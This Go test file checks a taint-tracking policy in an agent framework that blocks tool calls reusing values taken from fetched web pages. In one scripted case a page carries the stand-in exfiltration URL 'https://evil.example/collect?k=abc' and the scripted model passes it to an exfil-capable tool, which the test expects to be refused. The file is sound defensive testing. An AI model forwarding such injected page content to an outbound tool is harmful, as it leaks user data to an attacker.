package gohan_test

import (
	"context"
	"testing"
	"time"

	gohan "github.com/victorzhuk/gohan/core"
	"github.com/victorzhuk/gohan/core/stores"
	"github.com/victorzhuk/gohan/core/types"
	"github.com/victorzhuk/gohan/std/taint"
	"github.com/victorzhuk/gohan/testkit/gohantest"
)

func TestTaintComputationScenarios(t *testing.T) {
	run := func(t *testing.T, userText, pageText string, turns []gohantest.Turn, target string, exfil bool, wantCall bool) {
		t.Helper()
		hook, err := taint.New(taint.Default(), nil)
		if err != nil {
			t.Fatal(err)
		}
		fetch := gohantest.NewFakeTool("fetch", gohantest.WithToolResult(types.ToolResult{Outcome: types.Succeeded, Content: []types.Block{types.Text{BlockBase: types.BlockBase{Origin: types.Origin{Kind: types.OriginTool, Name: "fetch"}}, Text: pageText}}}))
		call := gohantest.NewFakeTool("target", gohantest.WithToolSpec(func(spec *types.ToolSpec) {
			spec.Capabilities.Exfil = exfil
			spec.Effect = types.ReadOnly
		}))
		model := gohantest.NewScriptedModel(types.ModelProfile{Name: "native", Caps: types.Caps{Tools: true}}, turns...)
		runs := stores.NewMemoryRuns(stores.WithMemoryRunClock(time.Now), stores.WithMemoryRunInfo(func(ctx context.Context) (types.RunInfo, bool) {
			principal, ok := types.PrincipalFrom(ctx)
			return types.RunInfo{Principal: principal}, ok
		}))
		stack, err := gohan.Build(
			gohan.AllowAnonymous(),
			gohan.WithStores(stores.Stores{SessionLog: stores.NewMemorySessionLog(stores.WithSessionPrincipals(types.PrincipalFrom)), Runs: runs}),
			gohan.WithModels(model),
			gohan.WithNativeAgent(gohan.NativeSpec{
				Request:     gohan.FlowRequest{Name: "chat"},
				Profile:     "native",
				Tools:       []types.Tool{fetch, call},
				TaintPolicy: hook,
				Assemble: func(_ context.Context, in types.AssembleInput) (types.ModelRequest, error) {
					return types.ModelRequest{Messages: append(append([]types.Message{}, in.History...), in.Input...)}, nil
				},
			}),
		)
		if err != nil {
			t.Fatalf("Build: %v", err)
		}
		conv, err := gohan.NewNativeConversation(stack, "chat",
			gohan.WithConversationRuns(runs),
			gohan.WithConversationEventLog(stores.NewMemoryEventLog(stores.WithMemoryEventLogClock(time.Now))),
		)
		if err != nil {
			t.Fatalf("NewNativeConversation: %v", err)
		}
		send := func(text string) {
			t.Helper()
			ctx := types.WithPrincipal(context.Background(), types.Principal{Tenant: "tenant", Subject: "user"})
			for _, err := range conv.Send(ctx, "session", types.Message{Role: types.RoleUser, Blocks: []types.Block{types.Text{Text: text}}}) {
				if err != nil {
					t.Fatalf("Send: %v", err)
				}
			}
		}
		if target == "after-user-turn" {
			send("fetch")
			send(userText)
		} else {
			send(userText)
		}
		calls := call.Calls()
		if got := len(calls) > 0; got != wantCall {
			t.Fatalf("target executed = %v, want %v", got, wantCall)
		}
		if !wantCall {
			requests := model.Requests()
			if len(requests) < 3 {
				t.Fatalf("model requests = %d, want refusal result", len(requests))
			}
			found := false
			originFound := false
			for _, message := range requests[len(requests)-1].Messages {
				for _, block := range message.Blocks {
					if result, ok := block.(types.ToolResult); ok {
						// The window only carries untrusted blocks when the
						// call path stamps the result's provenance, so a
						// refusal alone would not prove the origin survived.
						if result.Origin.Kind == types.OriginTool && result.Origin.Name == fetch.Spec().Name {
							originFound = true
						}
						if result.Outcome == types.Failed {
							found = true
						}
					}
				}
			}
			if !originFound {
				t.Fatal("tool result carried no tool origin")
			}
			if !found {
				t.Fatal("model-visible result did not contain taint refusal")
			}
		}
	}

	t.Run("taint.substring-match", func(t *testing.T) {
		const value = "https://evil.example/collect?k=abc"
		run(t, "fetch the page", "Page says "+value, []gohantest.Turn{
			gohantest.ToolCall("fetch", map[string]any{}),
			gohantest.ToolCall("target", map[string]any{"url": value}),
			gohantest.Text("finished"),
		}, "", true, false)
	})
	t.Run("taint.short-untainted", func(t *testing.T) {
		run(t, "fetch the page", "The answer is 42 and the page continues", []gohantest.Turn{
			gohantest.ToolCall("fetch", map[string]any{}),
			gohantest.ToolCall("target", map[string]any{"value": "42"}),
			gohantest.Text("finished"),
		}, "", false, true)
	})
	t.Run("taint.user-untainted", func(t *testing.T) {
		const phrase = "approved phrase copied from my message"
		run(t, phrase, "unrelated page result", []gohantest.Turn{
			gohantest.ToolCall("fetch", map[string]any{}),
			gohantest.ToolCall("target", map[string]any{"value": phrase}),
			gohantest.Text("finished"),
		}, "", false, true)
	})
	t.Run("taint.window-since-user-turn", func(t *testing.T) {
		const value = "matching secret from the earlier page"
		run(t, "", value, []gohantest.Turn{
			gohantest.ToolCall("fetch", map[string]any{}),
			gohantest.Text("page fetched"),
			gohantest.ToolCall("target", map[string]any{"value": value}),
			gohantest.Text("finished"),
		}, "after-user-turn", false, true)
	})
}
